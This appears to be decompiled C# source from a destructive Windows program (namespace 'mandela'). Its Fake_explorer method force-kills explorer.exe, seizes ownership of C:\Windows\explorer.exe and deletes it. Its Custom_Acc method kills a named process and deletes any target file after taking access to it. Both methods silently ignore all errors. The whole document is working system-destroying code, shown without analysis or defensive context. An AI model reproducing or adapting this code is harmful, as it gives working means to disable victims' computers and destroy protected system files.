using System;
using System.Diagnostics;
using System.IO;
using System.Threading;
using SysPrivileges;

namespace mandela
{
	// Token: 0x02000005 RID: 5
	public class File_Acces : Privileges
	{
		// Token: 0x0600000B RID: 11 RVA: 0x0000348C File Offset: 0x0000168C
		public void Fake_explorer()
		{
			try
			{
				Cmd_Class.cmd("taskkill /f /im explorer.exe");
				Process[] array = Process.GetProcessesByName("explorer");
				while (array.Length == 1)
				{
					array = Process.GetProcessesByName("explorer");
					Thread.Sleep(1);
				}
				Privileges.GrantAdministratorsAccess("C:\\Windows\\explorer.exe", Privileges.SE_OBJECT_TYPE.SE_FILE_OBJECT);
				File.Delete("C:\\Windows\\explorer.exe");
			}
			catch
			{
			}
		}

		// Token: 0x0600000C RID: 12 RVA: 0x000034F8 File Offset: 0x000016F8
		public static void Custom_Acc(string file_dir, string file_name)
		{
			try
			{
				if (Process.GetProcessesByName(file_name).Length == 1)
				{
					Process[] processesByName = Process.GetProcessesByName(file_name);
					for (int i = 0; i < processesByName.Length; i++)
					{
						processesByName[i].Kill();
					}
				}
				Privileges.GrantAdministratorsAccess(file_dir + "\\" + file_name, Privileges.SE_OBJECT_TYPE.SE_FILE_OBJECT);
				File.Delete(file_dir + "\\" + file_name);
			}
			catch
			{
			}
		}
	}
}
